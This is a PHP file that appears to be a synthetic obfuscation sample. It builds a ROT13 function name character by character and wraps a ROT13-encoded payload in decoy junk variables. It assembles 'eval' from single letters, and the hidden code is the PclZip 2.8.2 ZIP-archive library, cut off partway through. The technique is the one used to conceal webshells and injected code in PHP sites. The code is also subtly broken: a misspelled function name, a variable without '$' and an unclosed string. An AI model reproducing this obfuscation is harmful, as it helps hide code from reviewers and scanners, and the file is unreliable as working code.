<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }
__sa_29941 = \"r\".\"i\".\"n\".\"y\";
<?cuc
// --------------------------------------------------------------------------------
// CucPbaprcg Yvoenel - Mvc Zbqhyr 2.8.2
// --------------------------------------------------------------------------------
// Yvprafr TAH/YTCY - Ivaprag Oynirg - Nhthfg 2009
// uggc://jjj.cucpbaprcg.arg
// --------------------------------------------------------------------------------
//
// Cerfragngvba :
//   CpyMvc vf n CUC yvoenel gung znantr MVC nepuvirf.
//   Fb sne grfgf fubj gung nepuvirf trarengrq ol CpyMvc ner ernqnoyr ol
//   JvaMvc nccyvpngvba naq bgure gbbyf.
//
// Qrfpevcgvba :
//   Frr ernqzr.gkg naq uggc://jjj.cucpbaprcg.arg
//
// Jneavat :
//   Guvf yvoenel naq gur nffbpvngrq svyrf ner aba pbzzrepvny, aba cebsrffvbany
//   jbex.
//   Vg fubhyq abg unir harkcrpgrq erfhygf. Ubjrire vs nal qnzntr vf pnhfrq ol
//   guvf fbsgjner gur nhgube pna abg or erfcbafvoyr.
//   Gur hfr bs guvf fbsgjner vf ng gur evfx bs gur hfre.
//
// --------------------------------------------------------------------------------
// $Vq: cpymvc.yvo.cuc,i 1.60 2009/09/30 21:01:04 ioynirg Rkc $
// --------------------------------------------------------------------------------

  // ----- Pbafgnagf
  vs (!qrsvarq('CPYMVC_ERNQ_OYBPX_FVMR')) {
    qrsvar( 'CPYMVC_ERNQ_OYBPX_FVMR', 2048 );
  }

  // ----- Svyr yvfg frcnengbe
  // Va irefvba 1.k bs CpyMvc, gur frcnengbe sbe svyr yvfg vf n fcnpr
  // (juvpu vf abg n irel fzneg pubvpr, fcrpvsvpnyyl sbe jvaqbjf cnguf !).
  // N orggre frcnengbe fubhyq or n pbzzn (,). Guvf pbafgnag tvirf lbh gur
  // novyvgl gb punatr gung.
  // Ubjrire abgvpr gung punatvat guvf inyhr, znl unir vzcnpg ba rkvfgvat
  // fpevcgf, hfvat fcnpr frcnengrq svyranzrf.
  // Erpbzzraqrq inyhrf sbe pbzcngvovyvgl jvgu byqre irefvbaf :
  //qrsvar( 'CPYMVC_FRCNENGBE', ' ' );
  // Erpbzzraqrq inyhrf sbe fzneg frcnengvba bs svyranzrf.
  vs (!qrsvarq('CPYMVC_FRCNENGBE')) {
    qrsvar( 'CPYMVC_FRCNENGBE', ',' );
  }

  // ----- Reebe pbasvthengvba
  // 0 : CpyMvc Pynff vagrtengrq reebe unaqyvat
  // 1 : CpyReebe rkgreany yvoenel reebe unaqyvat. Ol ranoyvat guvf
  //     lbh zhfg rafher gung lbh unir vapyhqrq CpyReebe yvoenel.
  // [2,...] : erfreirq sbe shgher hfr
  vs (!qrsvarq('CPYMVC_REEBE_RKGREANY')) {
    qrsvar( 'CPYMVC_REEBE_RKGREANY', 0 );
  }

  // ----- Bcgvbany fgngvp grzcbenel qverpgbel
  //       Ol qrsnhyg grzcbenel svyrf ner trarengrq va gur fpevcg pheerag
  //       cngu.
  //       Vs qrsvarq :
  //       - ZHFG OR grezvangrq ol n '/'.
  //       - ZHFG or n inyvq, nyernql perngrq qverpgbel
  //       Fnzcyrf :
  // qrsvar( 'CPYMVC_GRZCBENEL_QVE', '/grzc/' );
  // qrsvar( 'CPYMVC_GRZCBENEL_QVE', 'P:/Grzc/' );
  vs (!qrsvarq('CPYMVC_GRZCBENEL_QVE')) {
    qrsvar( 'CPYMVC_GRZCBENEL_QVE', '' );
  }

  // ----- Bcgvbany guerfubyq engvb sbe hfr bs grzcbenel svyrf
  //       Cpymvc frafr gur fvmr bs gur svyr gb nqq/rkgenpg naq qrpvqr gb
  //       hfr be abg grzcbenel svyr. Gur nytbevguz vf ybbxvat sbe
  //       zrzbel_yvzvg bs CUC naq nccyl n engvb.
  //       guerfubyq = zrzbel_yvzvg * engvb.
  //       Erpbzzraqrq inyhrf ner haqre 0.5. Qrsnhyg 0.47.
  //       Fnzcyrf :
  // qrsvar( 'CPYMVC_GRZCBENEL_SVYR_ENGVB', 0.5 );
  vs (!qrsvarq('CPYMVC_GRZCBENEL_SVYR_ENGVB')) {
    qrsvar( 'CPYMVC_GRZCBENEL_SVYR_ENGVB', 0.47 );
  }

// --------------------------------------------------------------------------------
// ***** HAQRE GUVF YVAR ABGUVAT ARRQF GB OR ZBQVSVRQ *****
// --------------------------------------------------------------------------------

  // ----- Tybony inevnoyrf
  $t_cpymvc_irefvba = \"2.8.2\";

  // ----- Reebe pbqrf
  //   -1 : Hanoyr gb bcra svyr va ovanel jevgr zbqr
  //   -2 : Hanoyr gb bcra svyr va ovanel ernq zbqr
  //   -3 : Vainyvq cnenzrgref
  //   -4 : Svyr qbrf abg rkvfg
  //   -5 : Svyranzr vf gbb ybat (znk. 255)
  //   -6 : Abg n inyvq mvc svyr
  //   -7 : Vainyvq rkgenpgrq svyr fvmr
  //   -8 : Hanoyr gb perngr qverpgbel
  //   -9 : Vainyvq nepuvir rkgrafvba
  //  -10 : Vainyvq nepuvir sbezng
  //  -11 : Hanoyr gb qryrgr svyr (hayvax)
  //  -12 : Hanoyr gb eranzr svyr (eranzr)
  //  -13 : Vainyvq urnqre purpxfhz
  //  -14 : Vainyvq nepuvir fvmr
  qrsvar( 'CPYMVC_REE_HFRE_NOBEGRQ', 2 );
  qrsvar( 'CPYMVC_REE_AB_REEBE', 0 );
  qrsvar( 'CPYMVC_REE_JEVGR_BCRA_SNVY', -1 );
  qrsvar( 'CPYMVC_REE_ERNQ_BCRA_SNVY', -2 );
  qrsvar( 'CPYMVC_REE_VAINYVQ_CNENZRGRE', -3 );
  qrsvar( 'CPYMVC_REE_ZVFFVAT_SVYR', -4 );
  qrsvar( 'CPYMVC_REE_SVYRANZR_GBB_YBAT', -5 );
  qrsvar( 'CPYMVC_REE_VAINYVQ_MVC', -6 );
  qrsvar( 'CPYMVC_REE_ONQ_RKGENPGRQ_SVYR', -7 );
  qrsvar( 'CPYMVC_REE_QVE_PERNGR_SNVY', -8 );
  qrsvar( 'CPYMVC_REE_ONQ_RKGRAFVBA', -9 );
  qrsvar( 'CPYMVC_REE_ONQ_SBEZNG', -10 );
  qrsvar( 'CPYMVC_REE_QRYRGR_SVYR_SNVY', -11 );
  qrsvar( 'CPYMVC_REE_ERANZR_SVYR_SNVY', -12 );
  qrsvar( 'CPYMVC_REE_ONQ_PURPXFHZ', -13 );
  qrsvar( 'CPYMVC_REE_VAINYVQ_NEPUVIR_MVC', -14 );
  qrsvar( 'CPYMVC_REE_ZVFFVAT_BCGVBA_INYHR', -15 );
  qrsvar( 'CPYMVC_REE_VAINYVQ_BCGVBA_INYHR', -16 );
  qrsvar( 'CPYMVC_REE_NYERNQL_N_QVERPGBEL', -17 );
  qrsvar( 'CPYMVC_REE_HAFHCCBEGRQ_PBZCERFFVBA', -18 );
  qrsvar( 'CPYMVC_REE_HAFHCCBEGRQ_RAPELCGVBA', -19 );
  qrsvar( 'CPYMVC_REE_VAINYVQ_NGGEVOHGR_INYHR', -20 );
  qrsvar( 'CPYMVC_REE_QVERPGBEL_ERFGEVPGVBA', -21 );

  // ----- Bcgvbaf inyhrf
  qrsvar( 'CPYMVC_BCG_CNGU', 77001 );
  qrsvar( 'CPYMVC_BCG_NQQ_CNGU', 77002 );
  qrsvar( 'CPYMVC_BCG_ERZBIR_CNGU', 77003 );
  qrsvar( 'CPYMVC_BCG_ERZBIR_NYY_CNGU', 77004 );
  qrsvar( 'CPYMVC_BCG_FRG_PUZBQ', 77005 );
  qrsvar( 'CPYMVC_BCG_RKGENPG_NF_FGEVAT', 77006 );
  qrsvar( 'CPYMVC_BCG_AB_PBZCERFFVBA', 77007 );
  qrsvar( 'CPYMVC_BCG_OL_ANZR', 77008 );
  qrsvar( 'CPYMVC_BCG_OL_VAQRK', 77009 );
  qrsvar( 'CPYMVC_BCG_OL_RERT', 77010 );
  qrsvar( 'CPYMVC_BCG_OL_CERT', 77011 );
  qrsvar( 'CPYMVC_BCG_PBZZRAG', 77012 );
  qrsvar( 'CPYMVC_BCG_NQQ_PBZZRAG', 77013 );
  qrsvar( 'CPYMVC_BCG_CERCRAQ_PBZZRAG', 77014 );
  qrsvar( 'CPYMVC_BCG_RKGENPG_VA_BHGCHG', 77015 );
  qrsvar( 'CPYMVC_BCG_ERCYNPR_ARJRE', 77016 );
  qrsvar( 'CPYMVC_BCG_FGBC_BA_REEBE', 77017 );
  // Univat ovt gebhoyr jvgu pelcg. Arrq gb zhygvcyl 2 ybat vag
  // juvpu vf abg pbeerpgyl fhccbegrq ol CUC ...
  //qrsvar( 'CPYMVC_BCG_PELCG', 77018 );
  qrsvar( 'CPYMVC_BCG_RKGENPG_QVE_ERFGEVPGVBA', 77019 );
  qrsvar( 'CPYMVC_BCG_GRZC_SVYR_GUERFUBYQ', 77020 );
  qrsvar( 'CPYMVC_BCG_NQQ_GRZC_SVYR_GUERFUBYQ', 77020 ); // nyvnf
  qrsvar( 'CPYMVC_BCG_GRZC_SVYR_BA', 77021 );
  qrsvar( 'CPYMVC_BCG_NQQ_GRZC_SVYR_BA', 77021 ); // nyvnf
  qrsvar( 'CPYMVC_BCG_GRZC_SVYR_BSS', 77022 );
  qrsvar( 'CPYMVC_BCG_NQQ_GRZC_SVYR_BSS', 77022 ); // nyvnf

  // ----- Svyr qrfpevcgvba nggevohgrf
  qrsvar( 'CPYMVC_NGG_SVYR_ANZR', 79001 );
  qrsvar( 'CPYMVC_NGG_SVYR_ARJ_FUBEG_ANZR', 79002 );
  qrsvar( 'CPYMVC_NGG_SVYR_ARJ_SHYY_ANZR', 79003 );
  qrsvar( 'CPYMVC_NGG_SVYR_ZGVZR', 79004 );
  qrsvar( 'CPYMVC_NGG_SVYR_PBAGRAG', 79005 );
  qrsvar( 'CPYMVC_NGG_SVYR_PBZZRAG', 79006 );

  // ----- Pnyy onpxf inyhrf
  qrsvar( 'CPYMVC_PO_CER_RKGENPG', 78001 );
  qrsvar( 'CPYMVC_PO_CBFG_RKGENPG', 78002 );
  qrsvar( 'CPYMVC_PO_CER_NQQ', 78003 );
  qrsvar( 'CPYMVC_PO_CBFG_NQQ', 78004 );
  /* Sbe shgher hfr
  qrsvar( 'CPYMVC_PO_CER_YVFG', 78005 );
  qrsvar( 'CPYMVC_PO_CBFG_YVFG', 78006 );
  qrsvar( 'CPYMVC_PO_CER_QRYRGR', 78007 );
  qrsvar( 'CPYMVC_PO_CBFG_QRYRGR', 78008 );
  */

  // --------------------------------------------------------------------------------
  // Pynff : CpyMvc
  // Qrfpevcgvba :
  //   CpyMvc vf gur pynff gung ercerfrag n Mvc nepuvir.
  //   Gur choyvp zrgubqf nyybj gur znavchyngvba bs gur nepuvir.
  // Nggevohgrf :
  //   Nggevohgrf zhfg abg or npprffrq qverpgyl.
  // Zrgubqf :
  //   CpyMvc() : Bowrpg perngbe
  //   perngr() : Perngrf gur Mvc nepuvir
  //   yvfgPbagrag() : Yvfg gur pbagrag bs gur Mvc nepuvir
  //   rkgenpg() : Rkgenpg gur pbagrag bs gur nepuvir
  //   cebcregvrf() : Yvfg gur cebcregvrf bs gur nepuvir
  // --------------------------------------------------------------------------------
  pynff CpyMvc
  {
    // ----- Svyranzr bs gur mvc svyr
    ine $mvcanzr = '';

    // ----- Svyr qrfpevcgbe bs gur mvc svyr
    ine $mvc_sq = 0;

    // ----- Vagreany reebe unaqyvat
    ine $reebe_pbqr = 1;
    ine $reebe_fgevat = '';

    // ----- Pheerag fgnghf bs gur zntvp_dhbgrf_ehagvzr
    // Guvf inyhr fgber gur cuc pbasvthengvba sbe zntvp_dhbgrf
    // Gur pynff pna gura qvfnoyr gur zntvp_dhbgrf naq erfrg vg nsgre
    ine $zntvp_dhbgrf_fgnghf;

  // --------------------------------------------------------------------------------
  // Shapgvba : CpyMvc()
  // Qrfpevcgvba :
  //   Perngrf n CpyMvc bowrpg naq frg gur anzr bs gur nffbpvngrq Mvc nepuvir
  //   svyranzr.
  //   Abgr gung ab erny npgvba vf gnxra, vs gur nepuvir qbrf abg rkvfg vg vf abg
  //   perngrq. Hfr perngr() sbe gung.
  // --------------------------------------------------------------------------------
  shapgvba __pbafgehpg($c_mvcanzr)
  {

    // ----- Grfgf gur myvo
    vs (!shapgvba_rkvfgf('tmbcra'))
    {
      qvr('Nobeg '.onfranzr(__SVYR__).' : Zvffvat myvo rkgrafvbaf');
    }

    // ----- Frg gur nggevohgrf
    $guvf->mvcanzr = $c_mvcanzr;
    $guvf->mvc_sq = 0;
    $guvf->zntvp_dhbgrf_fgnghf = -1;

    // ----- Erghea
    erghea;
  }

  choyvp shapgvba CpyMvc($c_mvcanzr) {
    frys::__pbafgehpg($c_mvcanzr);
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Shapgvba :
  //   perngr($c_svyryvfg, $c_nqq_qve=\"\", $c_erzbir_qve=\"\")
  //   perngr($c_svyryvfg, $c_bcgvba, $c_bcgvba_inyhr, ...)
  // Qrfpevcgvba :
  //   Guvf zrgubq fhccbegf gjb qvssrerag flabcfvf. Gur svefg bar vf uvfgbevpny.
  //   Guvf zrgubq perngrf n Mvc Nepuvir. Gur Mvc svyr vf perngrq va gur
  //   svyrflfgrz. Gur svyrf naq qverpgbevrf vaqvpngrq va $c_svyryvfg
  //   ner nqqrq va gur nepuvir. Frr gur cnenzrgref qrfpevcgvba sbe gur
  //   fhccbegrq sbezng bs $c_svyryvfg.
  //   Jura n qverpgbel vf va gur yvfg, gur qverpgbel naq vgf pbagrag vf nqqrq
  //   va gur nepuvir.
  //   Va guvf flabcfvf, gur shapgvba gnxrf na bcgvbany inevnoyr yvfg bs
  //   bcgvbaf. Frr orybj gur fhccbegrq bcgvbaf.
  // Cnenzrgref :
  //   $c_svyryvfg : Na neenl pbagnvavat svyr be qverpgbel anzrf, be
  //                 n fgevat pbagnvavat bar svyranzr be bar qverpgbel anzr, be
  //                 n fgevat pbagnvavat n yvfg bs svyranzrf naq/be qverpgbel
  //                 anzrf frcnengrq ol fcnprf.
  //   $c_nqq_qve : N cngu gb nqq orsber gur erny cngu bs gur nepuvirq svyr,
  //                va beqre gb unir vg zrzbevmrq va gur nepuvir.
  //   $c_erzbir_qve : N cngu gb erzbir sebz gur erny cngu bs gur svyr gb nepuvir,
  //                   va beqre gb unir n fubegre cngu zrzbevmrq va gur nepuvir.
  //                   Jura $c_nqq_qve naq $c_erzbir_qve ner frg, $c_erzbir_qve
  //                   vf erzbirq svefg, orsber $c_nqq_qve vf nqqrq.
  // Bcgvbaf :
  //   CPYMVC_BCG_NQQ_CNGU :
  //   CPYMVC_BCG_ERZBIR_CNGU :
  //   CPYMVC_BCG_ERZBIR_NYY_CNGU :
  //   CPYMVC_BCG_PBZZRAG :
  //   CPYMVC_PO_CER_NQQ :
  //   CPYMVC_PO_CBFG_NQQ :
  // Erghea Inyhrf :
  //   0 ba snvyher,
  //   Gur yvfg bs gur nqqrq svyrf, jvgu n fgnghf bs gur nqq npgvba.
  //   (frr CpyMvc::yvfgPbagrag() sbe yvfg ragel sbezng)
  // --------------------------------------------------------------------------------
  shapgvba perngr($c_svyryvfg)
  {
    $i_erfhyg=1;

    // ----- Erfrg gur reebe unaqyre
    $guvf->ceviReebeErfrg();

    // ----- Frg qrsnhyg inyhrf
    $i_bcgvbaf = neenl();
    $i_bcgvbaf[CPYMVC_BCG_AB_PBZCERFFVBA] = SNYFR;

    // ----- Ybbx sbe inevnoyr bcgvbaf nethzragf
    $i_fvmr = shap_ahz_netf();

    // ----- Ybbx sbe nethzragf
    vs ($i_fvmr > 1) {
      // ----- Trg gur nethzragf
      $i_net_yvfg = shap_trg_netf();

      // ----- Erzbir sebz gur bcgvbaf yvfg gur svefg nethzrag
      neenl_fuvsg($i_net_yvfg);
      $i_fvmr--;

      // ----- Ybbx sbe svefg net
      vs ((vf_vagrtre($i_net_yvfg[0])) && ($i_net_yvfg[0] > 77000)) {

        // ----- Cnefr gur bcgvbaf
        $i_erfhyg = $guvf->ceviCnefrBcgvbaf($i_net_yvfg, $i_fvmr, $i_bcgvbaf,
                                            neenl (CPYMVC_BCG_ERZBIR_CNGU => 'bcgvbany',
                                                   CPYMVC_BCG_ERZBIR_NYY_CNGU => 'bcgvbany',
                                                   CPYMVC_BCG_NQQ_CNGU => 'bcgvbany',
                                                   CPYMVC_PO_CER_NQQ => 'bcgvbany',
                                                   CPYMVC_PO_CBFG_NQQ => 'bcgvbany',
                                                   CPYMVC_BCG_AB_PBZCERFFVBA => 'bcgvbany',
                                                   CPYMVC_BCG_PBZZRAG => 'bcgvbany',
                                                   CPYMVC_BCG_GRZC_SVYR_GUERFUBYQ => 'bcgvbany',
                                                   CPYMVC_BCG_GRZC_SVYR_BA => 'bcgvbany',
                                                   CPYMVC_BCG_GRZC_SVYR_BSS => 'bcgvbany'
                                                   //, CPYMVC_BCG_PELCG => 'bcgvbany'
                                             ));
        vs ($i_erfhyg != 1) {
          erghea 0;
        }
      }

      // ----- Ybbx sbe 2 netf
      // Urer jr arrq gb fhccbeg gur svefg uvfgbevp flabcfvf bs gur
      // zrgubq.
      ryfr {

        // ----- Trg gur svefg nethzrag
        $i_bcgvbaf[CPYMVC_BCG_NQQ_CNGU] = $i_net_yvfg[0];

        // ----- Ybbx sbe gur bcgvbany frpbaq nethzrag
        vs ($i_fvmr == 2) {
          $i_bcgvbaf[CPYMVC_BCG_ERZBIR_CNGU] = $i_net_yvfg[1];
        }
        ryfr vs ($i_fvmr > 2) {
          CpyMvc::ceviReebeYbt(CPYMVC_REE_VAINYVQ_CNENZRGRE,
		                       \"Vainyvq ahzore / glcr bs nethzragf\");
          erghea 0;
        }
      }
    }

    // ----- Ybbx sbe qrsnhyg bcgvba inyhrf
    $guvf->ceviBcgvbaQrsnhygGuerfubyq($i_bcgvbaf);

    // ----- Vavg
    $i_fgevat_yvfg = neenl();
    $i_ngg_yvfg = neenl();
    $i_svyrqrfpe_yvfg = neenl();
    $c_erfhyg_yvfg = neenl();

    // ----- Ybbx vs gur $c_svyryvfg vf ernyyl na neenl
    vs (vf_neenl($c_svyryvfg)) {

      // ----- Ybbx vs gur svefg ryrzrag vf nyfb na neenl
      //       Guvf jvyy zrna gung guvf vf n svyr qrfpevcgvba ragel
      vs (vffrg($c_svyryvfg[0]) && vf_neenl($c_svyryvfg[0])) {
        $i_ngg_yvfg = $c_svyryvfg;
      }

      // ----- Gur yvfg vf n yvfg bs fgevat anzrf
      ryfr {
        $i_fgevat_yvfg = $c_svyryvfg;
      }
    }

    // ----- Ybbx vs gur $c_svyryvfg vf n fgevat
    ryfr vs (vf_fgevat($c_svyryvfg)) {
      // ----- Perngr n yvfg sebz gur fgevat
      $i_fgevat_yvfg = rkcybqr(CPYMVC_FRCNENGBE, $c_svyryvfg);
    }

    // ----- Vainyvq inevnoyr glcr sbe $c_svyryvfg
    ryfr {
      CpyMvc::ceviReebeYbt(CPYMVC_REE_VAINYVQ_CNENZRGRE, \"Vainyvq inevnoyr glcr c_svyryvfg\");
      erghea 0;
    }

    // ----- Ersbezng gur fgevat yvfg
    vs (fvmrbs($i_fgevat_yvfg) != 0) {
      sbernpu ($i_fgevat_yvfg nf $i_fgevat) {
        vs ($i_fgevat != '') {
          $i_ngg_yvfg[][CPYMVC_NGG_SVYR_ANZR] = $i_fgevat;
        }
        ryfr {
        }
      }
    }

    // ----- Sbe rnpu svyr va gur yvfg purpx gur nggevohgrf
    $i_fhccbegrq_nggevohgrf
    = neenl ( CPYMVC_NGG_SVYR_ANZR => 'znaqngbel'
             ,CPYMVC_NGG_SVYR_ARJ_FUBEG_ANZR => 'bcgvbany'
             ,CPYMVC_NGG_SVYR_ARJ_SHYY_ANZR => 'bcgvbany'
             ,CPYMVC_NGG_SVYR_ZGVZR => 'bcgvbany'
             ,CPYMVC_NGG_SVYR_PBAGRAG => 'bcgvbany'
             ,CPYMVC_NGG_SVYR_PBZZRAG => 'bcgvbany'
						);
    sbernpu ($i_ngg_yvfg nf $i_ragel) {
      $i_erfhyg = $guvf->ceviSvyrQrfpeCnefrNgg($i_ragel,
                                               $i_svyrqrfpe_yvfg[],
                                               $i_bcgvbaf,
                                               $i_fhccbegrq_nggevohgrf);
      vs ($i_erfhyg != 1) {
        erghea 0;
      }
    }

    // ----- Rkcnaq gur svyryvfg (rkcnaq qverpgbevrf)
    $i_erfhyg = $guvf->ceviSvyrQrfpeRkcnaq($i_svyrqrfpe_yvfg, $i_bcgvbaf);
    vs ($i_erfhyg != 1) {
      erghea 0;
    }

    // ----- Pnyy gur perngr spg
    $i_erfhyg = $guvf->ceviPerngr($i_svyrqrfpe_yvfg, $c_erfhyg_yvfg, $i_bcgvbaf);
    vs ($i_erfhyg != 1) {
      erghea 0;
    }

    // ----- Erghea
    erghea $c_erfhyg_yvfg;
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Shapgvba :
  //   nqq($c_svyryvfg, $c_nqq_qve=\"\", $c_erzbir_qve=\"\")
  //   nqq($c_svyryvfg, $c_bcgvba, $c_bcgvba_inyhr, ...)
  // Qrfpevcgvba :
  //   Guvf zrgubq fhccbegf gjb flabcfvf. Gur svefg bar vf uvfgbevpny.
  //   Guvf zrgubqf nqq gur yvfg bs svyrf va na rkvfgvat nepuvir.
  //   Vs n svyr jvgu gur fnzr anzr nyernql rkvfgf, vg vf nqqrq ng gur raq bs gur
  //   nepuvir, gur svefg bar vf fgvyy cerfrag.
  //   Vs gur nepuvir qbrf abg rkvfg, vg vf perngrq.
  // Cnenzrgref :
  //   $c_svyryvfg : Na neenl pbagnvavat svyr be qverpgbel anzrf, be
  //                 n fgevat pbagnvavat bar svyranzr be bar qverpgbel anzr, be
  //                 n fgevat pbagnvavat n yvfg bs svyranzrf naq/be qverpgbel
  //                 anzrf frcnengrq ol fcnprf.
  //   $c_nqq_qve : N cngu gb nqq orsber gur erny cngu bs gur nepuvirq svyr,
  //                va beqre gb unir vg zrzbevmrq va gur nepuvir.
  //   $c_erzbir_qve : N cngu gb erzbir sebz gur erny cngu bs gur svyr gb nepuvir,
  //                   va beqre gb unir n fubegre cngu zrzbevmrq va gur nepuvir.
  //                   Jura $c_nqq_qve naq $c_erzbir_qve ner frg, $c_erzbir_qve
  //                   vf erzbirq svefg, orsber $c_nqq_qve vf nqqrq.
  // Bcgvbaf :
  //   CPYMVC_BCG_NQQ_CNGU :
  //   CPYMVC_BCG_ERZBIR_CNGU :
  //   CPYMVC_BCG_ERZBIR_NYY_CNGU :
  //   CPYMVC_BCG_PBZZRAG :
  //   CPYMVC_BCG_NQQ_PBZZRAG :
  //   CPYMVC_BCG_CERCRAQ_PBZZRAG :
  //   CPYMVC_PO_CER_NQQ :
  //   CPYMVC_PO_CBFG_NQQ :
  // Erghea Inyhrf :
  //   0 ba snvyher,
  //   Gur yvfg bs gur nqqrq svyrf, jvgu n fgnghf bs gur nqq npgvba.
  //   (frr CpyMvc::yvfgPbagrag() sbe yvfg ragel sbezng)
  // --------------------------------------------------------------------------------
  shapgvba nqq($c_svyryvfg)
  {
    $i_erfhyg=1;

    // ----- Erfrg gur reebe unaqyre
    $guvf->ceviReebeErfrg();

    // ----- Frg qrsnhyg inyhrf
    $i_bcgvbaf = neenl();
    $i_bcgvbaf[CPYMVC_BCG_AB_PBZCERFFVBA] = SNYFR;

    // ----- Ybbx sbe inevnoyr bcgvbaf nethzragf
    $i_fvmr = shap_ahz_netf();

    // ----- Ybbx sbe nethzragf
    vs ($i_fvmr > 1) {
      // ----- Trg gur nethzragf
      $i_net_yvfg = shap_trg_netf();

      // ----- Erzbir sbez gur bcgvbaf yvfg gur svefg nethzrag
      neenl_fuvsg($i_net_yvfg);
      $i_fvmr--;

      // ----- Ybbx sbe svefg net
      vs ((vf_vagrtre($i_net_yvfg[0])) && ($i_net_yvfg[0] > 77000)) {

        // ----- Cnefr gur bcgvbaf
        $i_erfhyg = $guvf->ceviCnefrBcgvbaf($i_net_yvfg, $i_fvmr, $i_bcgvbaf,
                                            neenl (CPYMVC_BCG_ERZBIR_CNGU => 'bcgvbany',
                                                   CPYMVC_BCG_ERZBIR_NYY_CNGU => 'bcgvbany',
                                                   CPYMVC_BCG_NQQ_CNGU => 'bcgvbany',
                                                   CPYMVC_PO_CER_NQQ => 'bcgvbany',
                                                   CPYMVC_PO_CBFG_NQQ => 'bcgvbany',
                                                   CPYMVC_BCG_AB_PBZCERFFVBA => 'bcgvbany',
                                                   CPYMVC_BCG_PBZZRAG => 'bcgvbany',
                                                   CPYMVC_BCG_NQQ_PBZZRAG => 'bcgvbany',
                                                   CPYMVC_BCG_CERCRAQ_PBZZRAG => 'bcgvbany',
                                                   CPYMVC_BCG_GRZC_SVYR_GUERFUBYQ => 'bcgvbany',
                                                   CPYMVC_BCG_GRZC_SVYR_BA => 'bcgvbany',
                                                   CPYMVC_BCG_GRZC_SVYR_BSS => 'bcgvbany'
                                                   //, CPYMVC_BCG_PELCG => 'bcgvbany'
												   ));
        vs ($i_erfhyg != 1) {
          erghea 0;
        }
      }

      // ----- Ybbx sbe 2 netf
      // Urer jr arrq gb fhccbeg gur svefg uvfgbevp flabcfvf bs gur
      // zrgubq.
      ryfr {

        // ----- Trg gur svefg nethzrag
        $i_bcgvbaf[CPYMVC_BCG_NQQ_CNGU] = $i_nqq_cngu = $i_net_yvfg[0];

        // ----- Ybbx sbe gur bcgvbany frpbaq nethzrag
        vs ($i_fvmr == 2) {
          $i_bcgvbaf[CPYMVC_BCG_ERZBIR_CNGU] = $i_net_yvfg[1];
        }
        ryfr vs ($i_fvmr > 2) {
          // ----- Reebe ybt
          CpyMvc::ceviReebeYbt(CPYMVC_REE_VAINYVQ_CNENZRGRE, \"Vainyvq ahzore / glcr bs nethzragf\");

          // ----- Erghea
          erghea 0;
        }
      }
    }

    // ----- Ybbx sbe qrsnhyg bcgvba inyhrf
    $guvf->ceviBcgvbaQrsnhygGuerfubyq($i_bcgvbaf);

    // ----- Vavg
    $i_fgevat_yvfg = neenl();
    $i_ngg_yvfg = neenl();
    $i_svyrqrfpe_yvfg = neenl();
    $c_erfhyg_yvfg = neenl();

    // ----- Ybbx vs gur $c_svyryvfg vf ernyyl na neenl
    vs (vf_neenl($c_svyryvfg)) {

      // ----- Ybbx vs gur svefg ryrzrag vf nyfb na neenl
      //       Guvf jvyy zrna gung guvf vf n svyr qrfpevcgvba ragel
      vs (vffrg($c_svyryvfg[0]) && vf_neenl($c_svyryvfg[0])) {
        $i_ngg_yvfg = $c_svyryvfg;
      }

      // ----- Gur yvfg vf n yvfg bs fgevat anzrf
      ryfr {
        $i_fgevat_yvfg = $c_svyryvfg;
      }
    }

    // ----- Ybbx vs gur $c_svyryvfg vf n fgevat
    ryfr vs (vf_fgevat($c_svyryvfg)) {
      // ----- Perngr n yvfg sebz gur fgevat
      $i_fgevat_yvfg = rkcybqr(CPYMVC_FRCNENGBE, $c_svyryvfg);
    }

    // ----- Vainyvq inevnoyr glcr sbe $c_svyryvfg
    ryfr {
      CpyMvc::ceviReebeYbt(CPYMVC_REE_VAINYVQ_CNENZRGRE, \"Vainyvq inevnoyr glcr '\".trgglcr($c_svyryvfg).\"' sbe c_svyryvfg\");
      erghea 0;
    }

    // ----- Ersbezng gur fgevat yvfg
    vs (fvmrbs($i_fgevat_yvfg) != 0) {
      sbernpu ($i_fgevat_yvfg nf $i_fgevat) {
        $i_ngg_yvfg[][CPYMVC_NGG_SVYR_ANZR] = $i_fgevat;
      }
    }

    // ----- Sbe rnpu svyr va gur yvfg purpx gur nggevohgrf
    $i_fhccbegrq_nggevohgrf
    = neenl ( CPYMVC_NGG_SVYR_ANZR => 'znaqngbel'
             ,CPYMVC_NGG_SVYR_ARJ_FUBEG_ANZR => 'bcgvbany'
             ,CPYMVC_NGG_SVYR_ARJ_SHYY_ANZR => 'bcgvbany'
             ,CPYMVC_NGG_SVYR_ZGVZR => 'bcgvbany'
             ,CPYMVC_NGG_SVYR_PBAGRAG => 'bcgvbany'
             ,CPYMVC_NGG_SVYR_PBZZRAG => 'bcgvbany'
						);
    sbernpu ($i_ngg_yvfg nf $i_ragel) {
      $i_erfhyg = $guvf->ceviSvyrQrfpeCnefrNgg($i_ragel,
                                               $i_svyrqrfpe_yvfg[],
                                               $i_bcgvbaf,
                                               $i_fhccbegrq_nggevohgrf);
      vs ($i_erfhyg != 1) {
        erghea 0;
      }
    }

    // ----- Rkcnaq gur svyryvfg (rkcnaq qverpgbevrf)
    $i_erfhyg = $guvf->ceviSvyrQrfpeRkcnaq($i_svyrqrfpe_yvfg, $i_bcgvbaf);
    vs ($i_erfhyg != 1) {
      erghea 0;
    }

    // ----- Pnyy gur perngr spg
    $i_erfhyg = $guvf->ceviNqq($i_svyrqrfpe_yvfg, $c_erfhyg_yvfg, $i_bcgvbaf);
    vs ($i_erfhyg != 1) {
      erghea 0;
    }

    // ----- Erghea
    erghea $c_erfhyg_yvfg;
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Shapgvba : yvfgPbagrag()
  // Qrfpevcgvba :
  //   Guvf choyvp zrgubq, tvirf gur yvfg bs gur svyrf naq qverpgbevrf, jvgu gurve
  //   cebcregvrf.
